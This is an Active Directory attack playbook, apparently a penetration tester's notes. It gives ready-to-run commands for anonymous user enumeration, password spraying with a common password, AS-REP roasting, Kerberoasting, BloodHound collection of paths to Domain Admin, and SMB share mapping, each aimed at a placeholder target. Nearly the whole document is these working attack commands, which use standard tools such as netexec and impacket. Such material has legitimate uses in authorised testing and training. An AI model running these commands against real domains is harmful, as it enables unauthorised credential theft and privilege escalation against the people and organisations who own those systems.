# Active Directory Enumeration Playbook

**Goal**: Map the domain, identify users, groups, bloodhound paths, and potential misconfigurations in an Active Directory environment.

## 1. User and Group Enumeration
Enumerate users without credentials via NULL session or anonymous bind, or with a low-privileged account.

<!-- cmd: linux -->
```bash
# [USED]
netexec smb <TARGET_IP> -u '' -p '' --users
```

<!-- cmd: linux -->
```bash
# [USED]
rpcclient -U "" -N <TARGET_IP> -c enumdomusers
```

## 2. Password Spraying and AS-REP Roasting
Test common passwords or roast accounts without pre-authentication.

<!-- cmd: linux -->
```bash
# [USED]
netexec smb <TARGET_IP> -u users.txt -p 'Welcome123!' --continue-on-success
```

<!-- cmd: linux -->
```bash
# [USED]
GetNPUsers.py -dc-ip <TARGET_IP> -request 'DOMAIN.LOCAL/' -usersfile users.txt -format hashcat
```

## 3. Kerberoasting
Request service tickets for accounts with SPNs to crack offline.

<!-- cmd: linux -->
```bash
# [USED]
GetUserSPNs.py -request -dc-ip <TARGET_IP> 'DOMAIN.LOCAL/user:password'
```

## 4. BloodHound Collection
Map the domain structure and find shortest paths to Domain Admin.

<!-- cmd: linux -->
```bash
# [USED]
bloodhound-python -u user -p password -d DOMAIN.LOCAL -ns <TARGET_IP> -c All
```

## 5. SMB Share Enumeration
Find readable shares containing sensitive files or passwords.

<!-- cmd: linux -->
```bash
# [USED]
smbmap -H <TARGET_IP> -u user -p password
```

## Related
- [netexec.md](../../tools/ad/netexec.md)
- [impacket.md](../../tools/ad/impacket.md)
